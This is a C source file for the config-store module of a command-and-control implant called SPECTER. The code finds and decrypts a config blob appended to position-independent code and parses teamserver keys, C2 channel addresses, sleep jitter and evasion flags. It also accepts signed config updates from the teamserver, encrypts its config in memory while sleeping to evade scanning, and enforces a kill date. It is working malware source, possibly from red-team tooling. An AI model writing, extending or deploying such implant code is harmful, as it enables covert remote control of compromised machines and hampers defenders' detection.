/**
 * SPECTER Implant — Config Store
 *
 * Locates the encrypted config blob appended after the PIC binary,
 * decrypts it using a key derived from the PIC code itself, and
 * provides runtime access, update (with signature verification),
 * in-memory encryption/decryption for sleep protection, and
 * kill-date enforcement via KUSER_SHARED_DATA.
 */

#include "specter.h"
#include "ntdefs.h"
#include "crypto.h"
#include "config.h"

/* ================================================================== */
/*  Static state                                                       */
/* ================================================================== */

static IMPLANT_CONFIG g_config;

/* In-memory encryption state (used during sleep) */
static BYTE g_cfg_enc_buf[sizeof(IMPLANT_CONFIG)];
static BYTE g_cfg_enc_nonce[AEAD_NONCE_SIZE];
static BYTE g_cfg_enc_tag[AEAD_TAG_SIZE];
static BYTE g_cfg_enc_key[AEAD_KEY_SIZE];
static BOOL g_cfg_is_encrypted;

/* ================================================================== */
/*  System time via KUSER_SHARED_DATA                                  */
/* ================================================================== */

#define KUSER_SHARED_DATA_ADDR   0x7FFE0000ULL
#define KSSD_SYSTEM_TIME_OFFSET  0x14

typedef struct _KSYSTEM_TIME {
    ULONG LowPart;
    LONG  High1Time;
    LONG  High2Time;
} KSYSTEM_TIME;

#ifdef TEST_BUILD
static QWORD g_test_system_time = 0;
static PVOID  g_test_pic_base   = NULL;

void cfg_test_set_pic_base(PVOID base)   { g_test_pic_base   = base; }
void cfg_test_set_system_time(QWORD t)   { g_test_system_time = t;   }
#endif

static QWORD cfg_get_system_time(void) {
#ifdef TEST_BUILD
    return g_test_system_time;
#else
    volatile KSYSTEM_TIME *st =
        (volatile KSYSTEM_TIME *)(KUSER_SHARED_DATA_ADDR + KSSD_SYSTEM_TIME_OFFSET);
    LONG  high;
    ULONG low;
    do {
        high = st->High1Time;
        low  = st->LowPart;
    } while (high != st->High2Time);
    return ((QWORD)(ULONG)high << 32) | (QWORD)low;
#endif
}

/* ================================================================== */
/*  PIC base address                                                   */
/* ================================================================== */

static PVOID cfg_get_pic_base(void) {
#ifdef TEST_BUILD
    return g_test_pic_base;
#else
    extern void implant_entry(PVOID);
    return (PVOID)implant_entry;
#endif
}

/* ================================================================== */
/*  Key derivation: SHA-256 of first 64 bytes of PIC blob              */
/* ================================================================== */

static void cfg_derive_key(PVOID pic_base, BYTE key_out[32]) {
    spec_sha256((const BYTE *)pic_base, CONFIG_KEY_INPUT_SIZE, key_out);
}

/* ================================================================== */
/*  Scan for config blob magic                                         */
/* ================================================================== */

static CONFIG_BLOB_HEADER *cfg_find_blob(PVOID pic_base) {
    BYTE *p = (BYTE *)pic_base;
    DWORD limit = CONFIG_SCAN_MAX - sizeof(CONFIG_BLOB_HEADER);

    for (DWORD i = CONFIG_SCAN_START; i < limit; i += 4) {
        DWORD val = *(DWORD *)(p + i);
        if (val == CONFIG_MAGIC) {
            CONFIG_BLOB_HEADER *hdr = (CONFIG_BLOB_HEADER *)(p + i);
            if (hdr->version == CONFIG_VERSION &&
                hdr->data_size > 0 &&
                hdr->data_size <= sizeof(IMPLANT_CONFIG) + 64) {
                return hdr;
            }
        }
    }
    return NULL;
}

/* Forward declaration — defined below cfg_init */
static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len);

/* ================================================================== */
/*  cfg_init                                                           */
/* ================================================================== */

NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    PVOID pic_base = cfg_get_pic_base();
    if (!pic_base)
        return (NTSTATUS)0xC0000002; /* STATUS_INVALID_PARAMETER — no pic base */

    spec_memset(&g_config, 0, sizeof(IMPLANT_CONFIG));
    g_cfg_is_encrypted = FALSE;

    /* Locate config blob */
    CONFIG_BLOB_HEADER *hdr = cfg_find_blob(pic_base);
    if (!hdr)
        return (NTSTATUS)0xC0000034; /* STATUS_OBJECT_NAME_NOT_FOUND — blob not found */

    /* Derive decryption key from PIC code */
    BYTE key[AEAD_KEY_SIZE];
    cfg_derive_key(pic_base, key);

    /* Encrypted data immediately follows the header */
    BYTE *enc_data = (BYTE *)hdr + sizeof(CONFIG_BLOB_HEADER);

    /* AAD = magic + version (first 8 bytes of header) */
    BYTE decrypted[sizeof(IMPLANT_CONFIG)];
    spec_memset(decrypted, 0, sizeof(decrypted));

    BOOL ok = spec_aead_decrypt(key, hdr->nonce,
                                enc_data, hdr->data_size,
                                (const BYTE *)&hdr->magic, 8,
                                decrypted, hdr->tag);

    /* Wipe key from stack */
    spec_memset(key, 0, sizeof(key));

    if (!ok)
        return (NTSTATUS)0xC000003A; /* decrypt failed */

    /* The decrypted payload is a TLV stream — parse it into g_config */
    spec_memset(&g_config, 0, sizeof(IMPLANT_CONFIG));
    cfg_patch_tlv(&g_config, decrypted, hdr->data_size);
    spec_memset(decrypted, 0, sizeof(decrypted));

    ctx->config = &g_config;

    /* Derive in-memory encryption key (for sleep protection).
     * IKM = implant private key, salt = system time. */
    QWORD now = cfg_get_system_time();
    spec_hkdf_derive((const BYTE *)&now, sizeof(now),
                     g_config.implant_privkey, 32,
                     (const BYTE *)"config-mem-key", 14,
                     g_cfg_enc_key, AEAD_KEY_SIZE);

    return STATUS_SUCCESS;
}

/* ================================================================== */
/*  cfg_get                                                            */
/* ================================================================== */

IMPLANT_CONFIG *cfg_get(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config)
        return NULL;
    return (IMPLANT_CONFIG *)ctx->config;
}

/* cfg_patch_tlv forward-declared above cfg_init */

/* ================================================================== */
/*  cfg_update — signed config update from teamserver                  */
/* ================================================================== */

NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !ctx->config || !data)
        return STATUS_INVALID_PARAMETER;

    /* data = [32-byte HMAC-SHA256 signature][payload] */
    if (len <= SHA256_DIGEST_SIZE)
        return STATUS_INVALID_PARAMETER;

    IMPLANT_CONFIG *cfg = (IMPLANT_CONFIG *)ctx->config;
    const BYTE *signature = data;
    const BYTE *payload   = data + SHA256_DIGEST_SIZE;
    DWORD payload_len     = len  - SHA256_DIGEST_SIZE;

    /* Verify HMAC-SHA256 signature */
    BYTE computed_mac[SHA256_DIGEST_SIZE];
    spec_hmac_sha256(cfg->module_signing_key, 32,
                     payload, payload_len, computed_mac);

    /* Constant-time comparison */
    BYTE diff = 0;
    for (DWORD i = 0; i < SHA256_DIGEST_SIZE; i++)
        diff |= computed_mac[i] ^ signature[i];

    spec_memset(computed_mac, 0, sizeof(computed_mac));

    if (diff != 0)
        return STATUS_ACCESS_DENIED;

    /* Check if payload has TLV extension data after the struct */
    DWORD struct_len = payload_len;
    DWORD tlv_len = 0;
    if (struct_len > sizeof(IMPLANT_CONFIG)) {
        tlv_len = struct_len - (DWORD)sizeof(IMPLANT_CONFIG);
        struct_len = (DWORD)sizeof(IMPLANT_CONFIG);
    }

    /* Preserve implant private key — never updated remotely */
    BYTE saved_privkey[32];
    spec_memcpy(saved_privkey, cfg->implant_privkey, 32);

    spec_memcpy(cfg, payload, struct_len);

    spec_memcpy(cfg->implant_privkey, saved_privkey, 32);
    spec_memset(saved_privkey, 0, 32);

    /* Parse TLV extension fields appended after the struct */
    if (tlv_len > 0)
        cfg_patch_tlv(cfg, payload + sizeof(IMPLANT_CONFIG), tlv_len);

    return STATUS_SUCCESS;
}

/* ================================================================== */
/*  cfg_patch_tlv — apply TLV-encoded partial config updates           */
/* ================================================================== */

/* TLV field IDs — must match config_gen.rs config_field module */
#define CFG_TLV_SERVER_PUBKEY       0x80
#define CFG_TLV_IMPLANT_PRIVKEY     0x81
#define CFG_TLV_CHANNEL_KIND        0x82
#define CFG_TLV_CHANNEL_ADDRESS     0x83
#define CFG_TLV_SLEEP_INTERVAL      0x84
#define CFG_TLV_SLEEP_JITTER        0x85
#define CFG_TLV_KILL_DATE           0x86
#define CFG_TLV_PROFILE_BLOB        0x87
#define CFG_TLV_EVASION_FLAGS       0x88

static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) {
    DWORD pos = 0;

    while (pos + 3 <= len) {
        BYTE fid = data[pos];
        WORD vlen = (WORD)data[pos + 1] | ((WORD)data[pos + 2] << 8);
        pos += 3;

        if (pos + vlen > len)
            break;  /* Truncated TLV — stop parsing */

        const BYTE *val = data + pos;

        switch (fid) {
        case CFG_TLV_SERVER_PUBKEY:
            if (vlen == 32)
                spec_memcpy(cfg->teamserver_pubkey, val, 32);
            break;

        case CFG_TLV_IMPLANT_PRIVKEY:
            if (vlen == 32)
                spec_memcpy(cfg->implant_privkey, val, 32);
            break;

        case CFG_TLV_CHANNEL_KIND: {
            /* Channel kind ("http", "https", "dns") — sets type for current channel */
            DWORD idx = cfg->channel_count;
            if (idx < CONFIG_MAX_CHANNELS) {
                DWORD type = CHANNEL_HTTP; /* default */
                if (vlen >= 3 && val[0] == 'd' && val[1] == 'n' && val[2] == 's')
                    type = CHANNEL_DNS;
                cfg->channels[idx].type = type;
                cfg->channels[idx].active = TRUE;
                cfg->channels[idx].priority = idx;
            }
            break;
        }

        case CFG_TLV_CHANNEL_ADDRESS: {
            /* Parse URL: "http://host:port/path" → url=host, port=N
               Supports: http://host:port/path, https://host/path,
               host:port, host (bare hostname) */
            DWORD idx = cfg->channel_count;
            if (idx < CONFIG_MAX_CHANNELS) {
                const char *s = (const char *)val;
                DWORD slen = vlen;
                DWORD default_port = 80;

                /* Skip scheme and determine default port / TLS flag */
                if (slen > 8 && s[0]=='h' && s[1]=='t' && s[2]=='t' &&
                    s[3]=='p' && s[4]=='s' && s[5]==':' && s[6]=='/' && s[7]=='/') {
                    s += 8; slen -= 8;
                    default_port = 443;
                    cfg->channels[idx].needs_tls = TRUE;
                } else if (slen > 7 && s[0]=='h' && s[1]=='t' && s[2]=='t' &&
                           s[3]=='p' && s[4]==':' && s[5]=='/' && s[6]=='/') {
                    s += 7; slen -= 7;
                    default_port = 80;
                    cfg->channels[idx].needs_tls = FALSE;
                } else {
                    cfg->channels[idx].needs_tls = FALSE;
                }

                /* Extract host (up to ':' or '/' or end) */
                DWORD hlen = 0;
                while (hlen < slen && s[hlen] != ':' && s[hlen] != '/')
                    hlen++;
                DWORD copy = hlen < 255 ? hlen : 255;
                spec_memcpy(cfg->channels[idx].url, s, copy);
                cfg->channels[idx].url[copy] = 0;

                /* Extract port if explicit, otherwise use default */
                DWORD port = default_port;
                if (hlen < slen && s[hlen] == ':') {
                    DWORD pstart = hlen + 1;
                    port = 0;
                    while (pstart < slen && s[pstart] >= '0' && s[pstart] <= '9') {
                        port = port * 10 + (s[pstart] - '0');
                        pstart++;
                    }
                    if (port == 0) port = default_port;
                }
                cfg->channels[idx].port = port;

                cfg->channel_count = idx + 1;
            }
            break;
        }

        case CFG_TLV_SLEEP_INTERVAL:
            /* Builder sends u64 (seconds); implant stores milliseconds */
            if (vlen >= 8) {
                QWORD secs = *(const QWORD *)val;
                cfg->sleep_interval = (DWORD)(secs * 1000);
            } else if (vlen >= 4) {
                cfg->sleep_interval = *(const DWORD *)val * 1000;
            }
            break;

        case CFG_TLV_SLEEP_JITTER:
            /* Builder sends 1 byte (percent 0-100) */
            if (vlen >= 1)
                cfg->jitter_percent = (DWORD)val[0];
            break;

        case CFG_TLV_KILL_DATE: {
            /* Builder sends u64 Unix timestamp (seconds since 1970-01-01).
               Convert to Windows FILETIME (100ns ticks since 1601-01-01).
               FILETIME = (unix_secs + 11644473600) * 10000000 */
            QWORD unix_ts = 0;
            if (vlen >= 8)
                unix_ts = *(const QWORD *)val;
            else if (vlen >= 4)
                unix_ts = (QWORD)(*(const DWORD *)val);
            if (unix_ts != 0)
                cfg->kill_date = (unix_ts + 11644473600ULL) * 10000000ULL;
            break;
        }

        case CFG_TLV_PROFILE_BLOB:
            /* Profile blob stored separately — attach to comms later */
            cfg->profile_id = vlen; /* Stash blob length; actual parsing deferred */
            break;

        case CFG_TLV_EVASION_FLAGS:
            /* Builder sends 1 byte bitfield */
            if (vlen >= 4)
                cfg->evasion_flags = *(const DWORD *)val;
            else if (vlen >= 1)
                cfg->evasion_flags = (DWORD)val[0];
            break;

        default:
            /* Unknown field — skip */
            break;
        }

        pos += vlen;
    }

    return STATUS_SUCCESS;
}

/* ================================================================== */
/*  cfg_encrypt — encrypt config in-memory before sleep                */
/* ================================================================== */

NTSTATUS cfg_encrypt(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    if (g_cfg_is_encrypted)
        return STATUS_SUCCESS;

    IMPLANT_CONFIG *cfg = (IMPLANT_CONFIG *)ctx->config;

    /* Build unique nonce from system time + checkin count */
    QWORD now = cfg_get_system_time();
    spec_memset(g_cfg_enc_nonce, 0, AEAD_NONCE_SIZE);
    spec_memcpy(g_cfg_enc_nonce, &now, 8);
    spec_memcpy(g_cfg_enc_nonce + 8, &cfg->checkin_count, 4);

    /* Encrypt into temp buffer, then overwrite plaintext */
    spec_aead_encrypt(g_cfg_enc_key, g_cfg_enc_nonce,
                      (const BYTE *)cfg, sizeof(IMPLANT_CONFIG),
                      NULL, 0,
                      g_cfg_enc_buf, g_cfg_enc_tag);

    spec_memcpy(cfg, g_cfg_enc_buf, sizeof(IMPLANT_CONFIG));
    g_cfg_is_encrypted = TRUE;

    return STATUS_SUCCESS;
}

/* ================================================================== */
/*  cfg_decrypt — decrypt config in-memory after sleep                 */
/* ================================================================== */

NTSTATUS cfg_decrypt(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    if (!g_cfg_is_encrypted)
        return STATUS_SUCCESS;

    IMPLANT_CONFIG *cfg = (IMPLANT_CONFIG *)ctx->config;

    BYTE decrypted[sizeof(IMPLANT_CONFIG)];
    BOOL ok = spec_aead_decrypt(g_cfg_enc_key, g_cfg_enc_nonce,
                                (const BYTE *)cfg, sizeof(IMPLANT_CONFIG),
                                NULL, 0,
                                decrypted, g_cfg_enc_tag);

    if (!ok)
        return STATUS_UNSUCCESSFUL;

    spec_memcpy(cfg, decrypted, sizeof(IMPLANT_CONFIG));
    spec_memset(decrypted, 0, sizeof(decrypted));
    g_cfg_is_encrypted = FALSE;

    return STATUS_SUCCESS;
}

/* ================================================================== */
/*  cfg_check_killdate                                                 */
/* ================================================================== */

BOOL cfg_check_killdate(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config)
        return TRUE;   /* No config → terminate */

    IMPLANT_CONFIG *cfg = (IMPLANT_CONFIG *)ctx->config;

    /* kill_date == 0 means no kill date set */
    if (cfg->kill_date == 0)
        return FALSE;

    QWORD now = cfg_get_system_time();
    return (now >= cfg->kill_date) ? TRUE : FALSE;
}
